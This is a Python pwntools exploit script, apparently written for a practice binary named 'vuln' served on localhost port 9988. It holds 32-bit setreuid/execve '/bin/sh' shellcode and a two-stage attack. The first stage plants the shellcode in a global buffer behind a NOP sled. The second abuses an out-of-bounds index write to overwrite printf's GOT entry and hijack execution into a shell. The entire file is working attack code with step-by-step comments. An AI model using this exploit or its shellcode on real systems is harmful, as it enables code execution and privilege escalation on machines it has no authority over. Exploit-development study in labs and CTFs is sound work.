from pwn import *

# --- Exploit Configuration ---
# Set the architecture context for pwntools
context.update(arch='i386', os='linux')

# Connection details for the remote service
# Change these if the service is running elsewhere
ip = '127.0.0.1'
port = 9988

# --- STATIC ADDRESSES (CRITICAL: Find these with GDB/objdump) ---
# These addresses are constant because the buffer is global and the
# binary is not a Position-Independent Executable (PIE).
# You MUST find the correct values for your compiled binary.
#
# To find BUF_ADDR: objdump -t ./vuln | grep buf
# To find PRINTF_GOT: objdump -R ./vuln | grep printf

BUF_ADDR = 0x08049940    # Placeholder: Replace with the actual address of 'buf'
PRINTF_GOT = 0x080498f8   # Placeholder: Replace with the actual address of printf's GOT entry

# --- SHELLCODE ---
# A standard 32-bit shellcode to execute /bin/sh
shellcode = (
    b'\x6a\x31\x58\x99\xcd\x80'                        # geteuid
    b'\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80'            # setreuid
    b'\xb0\x0b\x52\x68n/sh\x68//bi\x89\xe3\x89\xd1\xcd\x80'  # execve
)

# --- Exploit Logic ---
log.info("Starting exploit...")
p = remote(ip, port)

# --- STAGE 1: Place Shellcode into the Buffer ---
# We call vuln() with index 0 to copy our shellcode to the beginning
# of the static 'buf'.
log.info(f"Placing shellcode at the start of buf: {hex(BUF_ADDR)}")

# The payload is the shellcode itself. We add a NOP sled for stability.
payload_stage1 = b'\x90' * 16 + shellcode
index_stage1 = 0

# Send the first payload
p.sendlineafter(b'offset', f'{payload_stage1.decode("latin-1")} {index_stage1}'.encode())

# --- STAGE 2: Overwrite the GOT entry for printf ---
# Now, we call vuln() a second time. This time, the goal is to overwrite
# the pointer for printf() in the GOT with the address of our shellcode.
log.info(f"Preparing to overwrite printf@GOT ({hex(PRINTF_GOT)}) with our shellcode address ({hex(BUF_ADDR)})")

# The 'index' is the calculated offset from the start of 'buf' to printf's GOT entry.
# This positions '_ptr' exactly where we want to write.
index_stage2 = PRINTF_GOT - BUF_ADDR

# The 'name' we send is the address of our shellcode (the start of 'buf'),
# packed as a 4-byte little-endian string.
payload_stage2 = p32(BUF_ADDR)

log.info(f"Calculated offset (index): {index_stage2}")
log.info("Sending final payload to overwrite GOT...")

# Send the second payload
# Note: We use latin-1 encoding to handle raw bytes
p.sendlineafter(b'offset', f'{payload_stage2.decode("latin-1")} {index_stage2}'.encode())

# --- TRIGGER ---
# The exploit triggers on the server when `printf("Fresh data: %s\n", _ptr);` is called.
# The program will look up 'printf' in the GOT, find the address of our shellcode,
# and jump to it, giving us a shell.

log.success("Payload sent! You should have a shell.")
p.interactive()
